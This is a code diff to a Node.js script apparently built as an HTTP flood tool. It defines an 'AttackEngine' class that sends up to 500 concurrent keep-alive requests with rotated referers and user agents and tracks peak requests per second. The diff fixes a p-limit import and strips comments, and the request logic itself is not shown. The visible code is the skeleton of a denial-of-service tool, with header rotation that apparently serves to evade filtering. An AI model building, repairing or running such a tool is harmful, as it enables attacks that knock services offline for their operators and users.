@@ -5,12 +5,11 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 const cliProgress = require('cli-progress');
-const pLimit = require('p-limit');
+const pLimit = require('p-limit').default; // FIXED import for CommonJS
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 50, 500); // Dynamically scale
+const MAX_CONCURRENT = Math.min(os.cpus().length * 50, 500);
 const REQUEST_TIMEOUT = 10000;
 
-// Load list from file
 function loadLines(filename) {
     try {
         return fs.readFileSync(filename, 'utf8')
@@ -25,7 +24,6 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('uas.txt');
 
-// Keep-Alive Agents
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
 
@@ -40,7 +38,7 @@ class AttackEngine {
             errors: 0,
             peakRps: 0
         };
-        this.limit = pLimit(MAX_CONCURRENT);
+        this.limit = pLimit(MAX_CONCURRENT); // FIXED here
     }
 
     async makeRequest() {
@@ -95,7 +93,7 @@ class AttackEngine {
                 }
             });
 
-            await new Promise(r => setTimeout(r, 200)); // Small throttle
+            await new Promise(r => setTimeout(r, 200));
         }
 
         clearInterval(interval);
